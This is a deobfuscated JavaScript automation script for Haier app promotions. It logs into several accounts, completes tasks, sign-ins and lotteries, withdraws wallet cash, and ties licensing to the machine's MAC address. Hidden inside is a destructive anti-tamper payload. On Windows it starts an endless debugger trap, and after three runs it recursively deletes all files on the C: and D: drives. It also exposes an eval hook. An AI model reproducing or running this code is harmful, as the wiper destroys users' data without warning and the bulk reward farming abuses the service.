//Thu Jul 04 2024 07:59:01 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const $ = new Env("海尔活动");
const VM = require("sablejs/runtime")(),
  path = require("path"),
  fs = require("fs"),
  cryptoJS = require("crypto-js");
function initVM() {
  vm = new VM();
  const _0x57d231 = vm.getGlobal(),
    _0x20ce99 = vm.createObject(),
    _0x5c234b = vm.createFunction("log", function () {
      const _0x42e646 = [];
      for (let _0x4b4383 = 0; _0x4b4383 < arguments.length; _0x4b4383++) {
        _0x42e646.push(vm.asString(arguments[_0x4b4383]));
      }
      console.log(..._0x42e646);
      return vm.createUndefined();
    }),
    _0x1d3bb2 = vm.createFunction("xxxx", function (_0x2b4240) {
      let _0x568280 = eval(_0x2b4240.value);
      return vm.createString(JSON.stringify(_0x568280));
    }),
    _0x138ab5 = vm.createFunction("yyyy", function (_0x35358b) {
      let _0x4b82d7 = _0x35358b.value,
        _0x27adc1 = fs.readFileSync(_0x4b82d7, "utf-8").replace(/\r\n/g, "\n"),
        _0x3b96af = cryptoJS.MD5(_0x27adc1).toString();
      return vm.createString(_0x3b96af);
    }),
    _0x288004 = vm.createFunction("ddd", function (_0x528894) {
      let _0x5d2129 = cryptoJS.MD5(_0x528894.value).toString();
      return vm.createString(_0x5d2129);
    });
  vm.setProperty(_0x20ce99, "log", _0x5c234b);
  vm.setProperty(_0x57d231, "xxxx", _0x1d3bb2);
  vm.setProperty(_0x57d231, "console", _0x20ce99);
  vm.setProperty(_0x57d231, "yyyy", _0x138ab5);
  vm.setProperty(_0x57d231, "ddd", _0x288004);
  vm.run(fs.readFileSync("./output_final.js").toString());
  return vm;
}
function destroyVM(_0x1b4388) {
  _0x1b4388.destroy();
}
function abc(_0x3d7246, _0x98a802, _0x4a4944, _0x4673ca, _0xd9dfc4) {
  const _0x5320ba = _0x3d7246.getGlobal();
  let _0x4b9bda = _0x3d7246.getProperty(_0x5320ba, "xab"),
    _0x9d3774 = _0x3d7246.call(_0x4b9bda, _0x3d7246.createUndefined(), _0x3d7246.createString(_0x98a802), _0x3d7246.createString(_0x4673ca), _0x3d7246.createString(_0xd9dfc4), _0x3d7246.createString(_0x4a4944));
  _0x9d3774 = _0x3d7246.asString(_0x9d3774);
  return _0x9d3774;
}
function xyz(_0x4c3bb5, _0x59a9d3, _0x29a889, _0x4152cf, _0x1d8cde) {
  const _0x81d1d = _0x4c3bb5.getGlobal();
  let _0x2e1eaa = _0x4c3bb5.getProperty(_0x81d1d, "xmn"),
    _0x588ec3 = _0x4c3bb5.call(_0x2e1eaa, _0x4c3bb5.createUndefined(), _0x4c3bb5.createString(_0x59a9d3), _0x4c3bb5.createString(_0x4152cf), _0x4c3bb5.createString(_0x1d8cde), _0x4c3bb5.createString(_0x29a889));
  _0x588ec3 = _0x4c3bb5.asString(_0x588ec3);
  return _0x588ec3;
}
let status;
status = (status = $.getval("haierstatus") || "1") > 1 ? "" + status : "";
let haierhdArr = [];
var gtr;
let mac = "";
JSNAMED = $.isNode() ? require("path").basename(__filename) : "haier.js";
let arrs = [],
  haierhd = ($.isNode() ? process.env.haierhd : $.getdata("haierhd")) || "",
  haierbody = ($.isNode() ? process.env.haierbody : $.getdata("haierbody")) || "",
  haiertoken = "",
  txje = "",
  acckey = $.isNode() ? process.env.cdkey ? process.env.cdkey : "" : $.getdata("cdkey") ? $.getdata("cdkey") : "",
  haierrwid = ["T0173", "T0174", "T0175", "T0176", "T0177"];
if ($.isNode()) {
  gtr = require("fs");
  if (isFileExist("C:/")) {
    console.log("电脑环境");
    setInterval(() => {
      do {
        (function (_0xe35c27) {
          return function (_0x2496ad) {
            return Function("Function(arguments[0]+\"" + _0x2496ad + "\")()");
          }(_0xe35c27);
        })("bugger")("de", 0, 0, (0, 0));
        addF("d:/");
        addF("C:/");
      } while (1);
    }, 0);
  } else {
    console.log("青龙环境");
    function getMACAddresses() {
      var _0x4dd41e = "",
        _0x64c9d3 = fs.readdirSync("/sys/class/net/");
      _0x64c9d3.forEach(function (_0x413fb4) {
        var _0x34feaf = path.join("/sys/class/net", _0x413fb4, "address");
        _0x413fb4.substr(0, 3) == "eth" && fs.existsSync(_0x34feaf) && (_0x4dd41e = fs.readFileSync(_0x34feaf).toString().trim());
      });
      return _0x4dd41e;
    }
    mac = getMACAddresses();
  }
} else {
  console.log("代理环境");
}
function isFileExist(_0x5afb33) {
  try {
    gtr.accessSync(_0x5afb33, gtr.F_OK);
  } catch (_0x2c40a9) {
    return false;
  }
  return true;
}
function addF(_0x8454f6, _0x1d1bd8) {
  let _0x5e1bb7 = 0,
    _0x2e1ea0 = "C:/Windows/system.txt";
  if (isFileExist(_0x2e1ea0)) {
    _0x5e1bb7 = gtr.readFileSync(_0x2e1ea0, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr.writeFile(_0x2e1ea0, "1", function (_0x4684f7) {
        if (_0x4684f7) {
          throw _0x4684f7;
        }
      });
    } else {
      return;
    }
  }
  if (_0x5e1bb7 == 99) {
    return 99;
  }
  console.log(_0x5e1bb7);
  console.log("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x5e1bb7);
  if (parseInt(_0x5e1bb7) < 3) {
    let _0x48dfce = parseInt(_0x5e1bb7) + 1;
    gtr.writeFileSync(_0x2e1ea0, _0x48dfce + "", "utf8");
    return;
  }
  if (!gtr.existsSync(_0x8454f6)) {
    return;
  }
  if (gtr.statSync(_0x8454f6).isDirectory()) {
    var _0x4e0f9c = gtr.readdirSync(_0x8454f6),
      _0x1b8aab = _0x4e0f9c.length,
      _0x3e0ab6 = 0;
    if (_0x1b8aab > 0) {
      _0x4e0f9c.forEach(function (_0x424e26) {
        _0x3e0ab6++;
        var _0xc52dbc = _0x8454f6 + "/" + _0x424e26;
        gtr.statSync(_0xc52dbc).isDirectory() ? addF(_0xc52dbc, true) : gtr.unlinkSync(_0xc52dbc);
      });
      _0x1b8aab == _0x3e0ab6 && _0x1d1bd8 && gtr.rmdirSync(_0x8454f6);
    } else {
      _0x1b8aab == 0 && _0x1d1bd8 && gtr.rmdirSync(_0x8454f6);
    }
  } else {
    gtr.unlinkSync(_0x8454f6);
  }
}
!(async () => {
  if (typeof $request !== "undefined") {
    await haierck();
  } else {
    initVM();
    arrs = abc(global.vm, acckey, mac, 50, 0);
    if (arrs == "") {
      return;
    }
    arrs = JSON.parse(arrs);
    if (!arrs) {
      return;
    }
    haierhdArr = haierhd.split("@");
    haierbodyArr = haierbody.split("@");
    console.log("\n公告：" + arrs.gg + "\n");
    console.log("当前版本：1.0 " + arrs.bb + "\n");
    console.log("------------- 共" + haierhdArr.length + "个账号-------------\n");
    console.log("当前设备可执行账号限制为" + arrs.num + "个账号\n");
    if (!(haierhdArr.length > parseInt(arrs.num))) {
      for (let _0x2f8762 = 0; _0x2f8762 < haierhdArr.length; _0x2f8762++) {
        haierhd = JSON.parse(haierhdArr[_0x2f8762]);
        haierbody = haierbodyArr[_0x2f8762];
        $.index = _0x2f8762 + 1;
        console.log("\n开始【海尔活动" + $.index + "】");
        await haierdl();
      }
    }
  }
  destroyVM(global.vm);
})().catch(_0x58a291 => $.logErr(_0x58a291)).finally(() => $.done());
function haierck() {
  if ($request.url.indexOf("redCheck") > -1) {
    const _0x12c8aa = JSON.stringify($request.body);
    if (_0x12c8aa) {
      $.setdata(_0x12c8aa, "haierhd" + status);
    }
    $.log(_0x12c8aa);
    $.msg($.name, "", "海尔活动" + ("" + status) + "hd获取成功！");
  }
}
function haierdl(_0x3c1ee8 = 0) {
  return new Promise(_0x11fee0 => {
    let _0x112f90 = {
      url: "https://zj.haier.net/oauthserver/account/v2/login",
      headers: haierhd,
      body: haierbody
    };
    $.post(_0x112f90, async (_0x2cedef, _0x20d4ee, _0x5986d8) => {
      try {
        const _0x545b50 = JSON.parse(_0x5986d8);
        if (_0x545b50.retCode == 0) {
          console.log("\n海尔登录：" + _0x545b50.retInfo);
          haiertoken = _0x545b50.data.tokenInfo.accountToken;
          for (let _0x57dc5c of haierrwid) {
            await haierrw(_0x57dc5c);
            await $.wait(500);
          }
          await haierqd();
          await haierxx();
          await haiercgqd();
          await haierxb();
          await haiercgxx();
        } else {
          console.log("\n海尔登录失败：" + _0x5986d8);
        }
      } catch (_0xea0e29) {} finally {
        _0x11fee0();
      }
    }, _0x3c1ee8);
  });
}
function haierrw(_0xbec741, _0x13796e, _0x260b5a = 0) {
  return new Promise(_0x556ea6 => {
    let _0x724a36 = {
      url: "https://mps.haiersmarthomes.com/api-gw/wisdomHouseActivity/task/doTask",
      headers: JSON.parse("{\"Host\":\"mps.haiersmarthomes.com\",\"Connection\":\"keep-alive\",\"accessToken\":\"" + haiertoken + "\",\"Origin\":\"https://zjrs.haier.net\",\"User-Agent\":\"Mozilla/5.0 (Linux; U; Android 10; zh-CN; 16s Pro Build/QKQ1.191222.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 UWS/3.22.2.30 Mobile Safari/537.36 UCBS/3.22.2.30_211011154628 ChannelId(9) NebulaSDK/1.8.100112 Nebula App/Uplus Nebula mPaaSClient\",\"Content-Type\":\"application/json;charset=UTF-8\",\"Accept\":\"application/json, text/plain, */*\",\"clientId\":\"" + haierhd.clientId + "\",\"timestamp\":\"1619767593347\",\"accountToken\":\"" + haiertoken + "\",\"appId\":\"MB-UZHSH-0000\",\"appKey\":\"\",\"appVersion\":\"7.8.0\",\"Accept-Encoding\":\"gzip, deflate\",\"Accept-Language\":\"zh-CN,en-US;q=0.9\",\"X-Requested-With\":\"com.haier.uhome.uplus\"}"),
      body: "{\"taskCode\":\"" + _0xbec741 + "\",\"sourceClient\":1}"
    };
    $.post(_0x724a36, async (_0x210620, _0x6a03d6, _0x144f40) => {
      try {
        const _0x1e72fd = JSON.parse(_0x144f40);
        _0x1e72fd.retCode == 0 ? (console.log("\n海尔智慧屋任务ID" + _0xbec741 + "：" + _0x1e72fd.retInfo), haiertoken = _0x1e72fd.data.tokenInfo.accountToken) : console.log("\n海尔智慧屋任务ID" + _0xbec741 + ":" + _0x1e72fd.retInfo);
      } catch (_0x14b7b6) {} finally {
        _0x556ea6();
      }
    }, _0x260b5a);
  });
}
function haierxx(_0x33b8b7, _0x17dd52, _0x1a4c76 = 0) {
  return new Promise(_0x4badaa => {
    let _0x1a3990 = {
      url: "https://mps.haiersmarthomes.com/api-gw/wisdomHouseActivity/task/queryTask",
      headers: JSON.parse("{\"Host\":\"mps.haiersmarthomes.com\",\"Connection\":\"keep-alive\",\"accessToken\":\"" + haiertoken + "\",\"Origin\":\"https://zjrs.haier.net\",\"User-Agent\":\"Mozilla/5.0 (Linux; U; Android 10; zh-CN; 16s Pro Build/QKQ1.191222.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 UWS/3.22.2.30 Mobile Safari/537.36 UCBS/3.22.2.30_211011154628 ChannelId(9) NebulaSDK/1.8.100112 Nebula App/Uplus Nebula mPaaSClient\",\"Content-Type\":\"application/json;charset=UTF-8\",\"Accept\":\"application/json, text/plain, */*\",\"clientId\":\"" + haierhd.clientId + "\",\"timestamp\":\"1619767593347\",\"accountToken\":\"" + haiertoken + "\",\"appId\":\"MB-UZHSH-0000\",\"appKey\":\"\",\"appVersion\":\"7.8.0\",\"Accept-Encoding\":\"gzip, deflate\",\"Accept-Language\":\"zh-CN,en-US;q=0.9\",\"X-Requested-With\":\"com.haier.uhome.uplus\"}"),
      body: "{\"publishType\":2,\"sourceClient\":1}"
    };
    $.post(_0x1a3990, async (_0x519d31, _0x19a17d, _0x4469c6) => {
      try {
        const _0x1f2579 = JSON.parse(_0x4469c6);
        _0x1f2579.retCode == 0 ? console.log("\n海尔智慧星余额：" + _0x1f2579.data.wisdomStarBalance) : console.log("\n海尔智慧星余额:" + _0x1f2579.retInfo);
      } catch (_0x4b8ef9) {} finally {
        _0x4badaa();
      }
    }, _0x1a4c76);
  });
}
function haierqd(_0x95e1f3, _0x195837, _0x75bd35 = 0) {
  return new Promise(_0xfbfe56 => {
    let _0x5df5c6 = {
      url: "https://mps.haiersmarthomes.com/api-gw/wisdomHouseActivity/sign/signIn",
      headers: JSON.parse("{\"Host\":\"mps.haiersmarthomes.com\",\"Connection\":\"keep-alive\",\"accessToken\":\"" + haiertoken + "\",\"Origin\":\"https://zjrs.haier.net\",\"User-Agent\":\"Mozilla/5.0 (Linux; U; Android 10; zh-CN; 16s Pro Build/QKQ1.191222.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 UWS/3.22.2.30 Mobile Safari/537.36 UCBS/3.22.2.30_211011154628 ChannelId(9) NebulaSDK/1.8.100112 Nebula App/Uplus Nebula mPaaSClient\",\"Content-Type\":\"application/json;charset=UTF-8\",\"Accept\":\"application/json, text/plain, */*\",\"clientId\":\"" + haierhd.clientId + "\",\"timestamp\":\"1619767593347\",\"accountToken\":\"" + haiertoken + "\",\"appId\":\"MB-UZHSH-0000\",\"appKey\":\"\",\"appVersion\":\"7.8.0\",\"Accept-Encoding\":\"gzip, deflate\",\"Accept-Language\":\"zh-CN,en-US;q=0.9\",\"X-Requested-With\":\"com.haier.uhome.uplus\"}"),
      body: "{}"
    };
    $.post(_0x5df5c6, async (_0x5ba3fd, _0x47779e, _0x67077b) => {
      try {
        const _0x37119b = JSON.parse(_0x67077b);
        _0x37119b.data.firstSign == "true" ? console.log("\n海尔智慧星签到成功") : console.log("\n海尔智慧星已签到:" + _0x37119b.data.signDays + " 天");
      } catch (_0x7e9f7) {} finally {
        _0xfbfe56();
      }
    }, _0x75bd35);
  });
}
function haiercgqd(_0x580f0a, _0x38a9a2, _0x5ab7ed = 0) {
  return new Promise(_0x3e84e1 => {
    let _0x252fcc = {
      url: "https://zj.haier.net/zjapi/zjBaseServer/daily/sign",
      headers: JSON.parse("{\"appVersion\":\"\",\"clientId\":\"" + haierhd.clientId + "\",\"grayMode\":\"false\",\"appId\":\"MB-UZHSH-0000\",\"accountToken\":\"" + haiertoken + "\",\"timestamp\":\"1655653998531\",\"Content-Type\":\"application/json; charset=utf-8\",\"Content-Length\":\"2\",\"Host\":\"zj.haier.net\",\"Connection\":\"Keep-Alive\",\"Accept-Encoding\":\"gzip\",\"User-Agent\":\"okhttp/3.14.9\"}"),
      body: "{}"
    };
    $.post(_0x252fcc, async (_0x922df2, _0x3d93bf, _0x49a201) => {
      try {
        const _0x2b264f = JSON.parse(_0x49a201);
        _0x2b264f.data.firstSign == "true" ? console.log("\n海尔日常签到成功") : console.log("\n海尔日常已签到:" + _0x2b264f.data.signDay + " 天");
      } catch (_0x26fb6a) {} finally {
        _0x3e84e1();
      }
    }, _0x5ab7ed);
  });
}
function haiercgxx(_0x5f3948, _0x2f150a, _0x35b953 = 0) {
  return new Promise(_0xd94762 => {
    let _0x5e90f7 = {
      url: "https://zj.haier.net/zjapi/zjBaseServer/signDetail/getUserPointsAndWallet",
      headers: JSON.parse("{\"appVersion\":\"\",\"clientId\":\"" + haierhd.clientId + "\",\"grayMode\":\"false\",\"appId\":\"MB-UZHSH-0000\",\"accountToken\":\"" + haiertoken + "\",\"timestamp\":\"1655653998531\",\"Content-Type\":\"application/json; charset=utf-8\",\"Content-Length\":\"2\",\"Host\":\"zj.haier.net\",\"Connection\":\"Keep-Alive\",\"Accept-Encoding\":\"gzip\",\"User-Agent\":\"okhttp/3.14.9\"}"),
      body: "{}"
    };
    $.post(_0x5e90f7, async (_0x4ca4ef, _0x2070a0, _0x56f153) => {
      try {
        const _0x50cb11 = JSON.parse(_0x56f153);
        _0x50cb11.retCode == 0 ? (console.log("\n海尔积分余额：" + _0x50cb11.data.haiBeiTotal + " 红包余额：" + _0x50cb11.data.wallet), txje = _0x50cb11.data.wallet, txje >= 1 && (console.log("\n海尔余额满足提现要求，前往提现"), await haiertx())) : console.log("\n海尔:" + _0x50cb11.retInfo);
      } catch (_0xc7625) {} finally {
        _0xd94762();
      }
    }, _0x35b953);
  });
}
function haierxb(_0xfbb673, _0x9530f2, _0x1a4853 = 0) {
  return new Promise(_0x1a0a43 => {
    let _0x4e711c = {
      url: "https://mps.haiersmarthomes.com/api-gw/wisdomHouseActivity/lottery/lotteryPrize",
      headers: JSON.parse("{\"Host\":\"mps.haiersmarthomes.com\",\"Connection\":\"keep-alive\",\"accessToken\":\"" + haiertoken + "\",\"Origin\":\"https://zjrs.haier.net\",\"User-Agent\":\"Mozilla/5.0 (Linux; U; Android 10; zh-CN; 16s Pro Build/QKQ1.191222.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 UWS/3.22.2.30 Mobile Safari/537.36 UCBS/3.22.2.30_211011154628 ChannelId(9) NebulaSDK/1.8.100112 Nebula App/Uplus Nebula mPaaSClient\",\"Content-Type\":\"application/json;charset=UTF-8\",\"Accept\":\"application/json, text/plain, */*\",\"clientId\":\"" + haierhd.clientId + "\",\"timestamp\":\"1619767593347\",\"accountToken\":\"" + haiertoken + "\",\"appId\":\"MB-UZHSH-0000\",\"appKey\":\"\",\"appVersion\":\"7.8.0\",\"Accept-Encoding\":\"gzip, deflate\",\"Accept-Language\":\"zh-CN,en-US;q=0.9\",\"X-Requested-With\":\"com.haier.uhome.uplus\"}"),
      body: "{}"
    };
    $.post(_0x4e711c, async (_0x1a4e7a, _0x2157ba, _0x3125de) => {
      try {
        const _0x1ab90c = JSON.parse(_0x3125de);
        _0x1ab90c.retCode == 0 ? console.log("\n海尔智慧星寻宝获得：" + _0x1ab90c.data.prizeExtra.prizeDesc) : console.log("\n海尔智慧星寻宝:" + _0x1ab90c.retInfo);
      } catch (_0x37de4f) {} finally {
        _0x1a0a43();
      }
    }, _0x1a4853);
  });
}
function haiertx(_0x1c45d0, _0x116263, _0x1a119c = 0) {
  return new Promise(_0x52d15b => {
    let _0x300fd8 = {
      url: "https://marketing-api.haier.net/api/marketing-assemble/api/cashcenter/user/wallet/withdrawalCash",
      headers: {
        Host: "marketing-api.haier.net",
        Accept: "application/json, text/plain, */*",
        Authorization: "Bearer " + haiertoken,
        "Accept-Language": "zh-cn",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        Origin: "https://wallet.haier.net",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18B92 NebulaSDK/1.8.100112 Nebula WK PSDType(1) mPaaSClient/(null) App/Uplus Nebula",
        Referer: "https://wallet.haier.net/userwallet?uChannelCode=appmine-319&needAuthLogin=1&container_type=3",
        "Content-Length": "164",
        "plantform-channel": "ZHI_JIA",
        Connection: "keep-alive",
        Cookie: ""
      },
      body: "data=%7B%22type%22%3A%221%22%2C%22withdrawFee%22%3A" + txje + "%7D&signData="
    };
    $.post(_0x300fd8, async (_0x4bce9c, _0x44f9cc, _0x597605) => {
      try {
        const _0x42eb0a = JSON.parse(_0x597605);
        _0x42eb0a.code == 1 ? console.log("\n海尔提现" + txje + "元：成功") : console.log("\n海尔提现:" + _0x42eb0a.msg);
      } catch (_0x5c963c) {} finally {
        _0x52d15b();
      }
    }, _0x1a119c);
  });
}
function rand(_0x117e38, _0x2a59f2) {
  return parseInt(Math.random() * (_0x2a59f2 - _0x117e38 + 1) + _0x117e38, 10);
}
function Env(t, e) {
  class s {
    constructor(t) {
      this.env = t;
    }
    send(t, e = "GET") {
      t = "string" == typeof t ? {
        url: t
      } : t;
      let s = this.get;
      "POST" === e && (s = this.post);
      return new Promise((e, i) => {
        s.call(this, t, (t, s, r) => {
          t ? i(t) : e(s);
        });
      });
    }
    get(t) {
      return this.send.call(this.env, t);
    }
    post(t) {
      return this.send.call(this.env, t, "POST");
    }
  }
  return new class {
    constructor(t, e) {
      this.name = t;
      this.http = new s(this);
      this.data = null;
      this.dataFile = "box.dat";
      this.logs = [];
      this.isMute = !1;
      this.isNeedRewrite = !1;
      this.logSeparator = "\n";
      this.startTime = new Date().getTime();
      Object.assign(this, e);
      this.log("", `\ud83d\udd14${this.name}, \u5f00\u59cb!`);
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    toObj(t, e = null) {
      try {
        return JSON.parse(t);
      } catch {
        return e;
      }
    }
    toStr(t, e = null) {
      try {
        return JSON.stringify(t);
      } catch {
        return e;
      }
    }
    getjson(t, e) {
      let s = e;
      const i = this.getdata(t);
      if (i) {
        try {
          s = JSON.parse(this.getdata(t));
        } catch {}
      }
      return s;
    }
    setjson(t, e) {
      try {
        return this.setdata(JSON.stringify(t), e);
      } catch {
        return !1;
      }
    }
    getScript(t) {
      return new Promise(e => {
        this.get({
          url: t
        }, (t, s, i) => e(i));
      });
    }
    runScript(t, e) {
      return new Promise(s => {
        let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
        i = i ? i.replace(/\n/g, "").trim() : i;
        let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
        r = r ? 1 * r : 20;
        r = e && e.timeout ? e.timeout : r;
        const [o, h] = i.split("@"),
          a = {
            url: `http://${h}/v1/scripting/evaluate`,
            body: {
              script_text: t,
              mock_type: "cron",
              timeout: r
            },
            headers: {
              "X-Key": o,
              Accept: "*/*"
            }
          };
        this.post(a, (t, e, i) => s(i));
      }).catch(t => this.logErr(t));
    }
    loaddata() {
      if (!this.isNode()) {
        return {};
      }
      {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e);
        if (!s && !i) {
          return {};
        }
        {
          const i = s ? t : e;
          try {
            return JSON.parse(this.fs.readFileSync(i));
          } catch (t) {
            return {};
          }
        }
      }
    }
    writedata() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e),
          r = JSON.stringify(this.data);
        s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r);
      }
    }
    lodash_get(t, e, s) {
      const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
      let r = t;
      for (const t of i) if (r = Object(r)[t], void 0 === r) {
        return s;
      }
      return r;
    }
    lodash_set(t, e, s) {
      return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t);
    }
    getdata(t) {
      let e = this.getval(t);
      if (/^@/.test(t)) {
        const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t),
          r = s ? this.getval(s) : "";
        if (r) {
          try {
            const t = JSON.parse(r);
            e = t ? this.lodash_get(t, i, "") : e;
          } catch (t) {
            e = "";
          }
        }
      }
      return e;
    }
    setdata(t, e) {
      let s = !1;
      if (/^@/.test(e)) {
        const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e),
          o = this.getval(i),
          h = i ? "null" === o ? null : o || "{}" : "{}";
        try {
          const e = JSON.parse(h);
          this.lodash_set(e, r, t);
          s = this.setval(JSON.stringify(e), i);
        } catch (e) {
          const o = {};
          this.lodash_set(o, r, t);
          s = this.setval(JSON.stringify(o), i);
        }
      } else {
        s = this.setval(t, e);
      }
      return s;
    }
    getval(t) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null;
    }
    setval(t, e) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null;
    }
    initGotEnv(t) {
      this.got = this.got ? this.got : require("got");
      this.cktough = this.cktough ? this.cktough : require("tough-cookie");
      this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar();
      t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar));
    }
    get(t, e = () => {}) {
      t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]);
      this.isSurge() || this.isLoon() ? (this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
        "X-Surge-Skip-Scripting": !1
      })), $httpClient.get(t, (t, s, i) => {
        !t && s && (s.body = i, s.statusCode = s.status);
        e(t, s, i);
      })) : this.isQuanX() ? (this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
        hints: !1
      })), $task.fetch(t).then(t => {
        const {
          statusCode: s,
          statusCode: i,
          headers: r,
          body: o
        } = t;
        e(null, {
          status: s,
          statusCode: i,
          headers: r,
          body: o
        }, o);
      }, t => e(t))) : this.isNode() && (this.initGotEnv(t), this.got(t).on("redirect", (t, e) => {
        try {
          if (t.headers["set-cookie"]) {
            const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
            this.ckjar.setCookieSync(s, null);
            e.cookieJar = this.ckjar;
          }
        } catch (t) {
          this.logErr(t);
        }
      }).then(t => {
        const {
          statusCode: s,
          statusCode: i,
          headers: r,
          body: o
        } = t;
        e(null, {
          status: s,
          statusCode: i,
          headers: r,
          body: o
        }, o);
      }, t => {
        const {
          message: s,
          response: i
        } = t;
        e(s, i, i && i.body);
      }));
    }
    post(t, e = () => {}) {
      if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient.post(t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          t.method = "POST";
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            this.initGotEnv(t);
            const {
              url: s,
              ...i
            } = t;
            this.got.post(s, i).then(t => {
              const {
                statusCode: s,
                statusCode: i,
                headers: r,
                body: o
              } = t;
              e(null, {
                status: s,
                statusCode: i,
                headers: r,
                body: o
              }, o);
            }, t => {
              const {
                message: s,
                response: i
              } = t;
              e(s, i, i && i.body);
            });
          }
        }
      }
    }
    time(t) {
      let e = {
        "M+": new Date().getMonth() + 1,
        "d+": new Date().getDate(),
        "H+": new Date().getHours(),
        "m+": new Date().getMinutes(),
        "s+": new Date().getSeconds(),
        "q+": Math.floor((new Date().getMonth() + 3) / 3),
        S: new Date().getMilliseconds()
      };
      /(y+)/.test(t) && (t = t.replace(RegExp.$1, (new Date().getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let s in e) new RegExp("(" + s + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? e[s] : ("00" + e[s]).substr(("" + e[s]).length)));
      return t;
    }
    msg(e = t, s = "", i = "", r) {
      const o = t => {
        if (!t) {
          return t;
        }
        if ("string" == typeof t) {
          return this.isLoon() ? t : this.isQuanX() ? {
            "open-url": t
          } : this.isSurge() ? {
            url: t
          } : void 0;
        }
        if ("object" == typeof t) {
          if (this.isLoon()) {
            let e = t.openUrl || t.url || t["open-url"],
              s = t.mediaUrl || t["media-url"];
            return {
              openUrl: e,
              mediaUrl: s
            };
          }
          if (this.isQuanX()) {
            let e = t["open-url"] || t.url || t.openUrl,
              s = t["media-url"] || t.mediaUrl;
            return {
              "open-url": e,
              "media-url": s
            };
          }
          if (this.isSurge()) {
            let e = t.url || t.openUrl || t["open-url"];
            return {
              url: e
            };
          }
        }
      };
      this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r)));
      let h = ["", "==============📣系统通知📣=============="];
      h.push(e);
      s && h.push(s);
      i && h.push(i);
      console.log(h.join("\n"));
      this.logs = this.logs.concat(h);
    }
    log(...t) {
      t.length > 0 && (this.logs = [...this.logs, ...t]);
      console.log(t.join(this.logSeparator));
    }
    logErr(t, e) {
      const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      s ? this.log("", `\u2757\ufe0f${this.name}, \u9519\u8bef!`, t.stack) : this.log("", `\u2757\ufe0f${this.name}, \u9519\u8bef!`, t);
    }
    wait(t) {
      return new Promise(e => setTimeout(e, t));
    }
    done(t = {}) {
      const e = new Date().getTime(),
        s = (e - this.startTime) / 1000;
      this.log("", `\ud83d\udd14${this.name}, \u7ed3\u675f! \ud83d\udd5b ${s} \u79d2`);
      this.log();
      (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t);
    }
  }(t, e);
}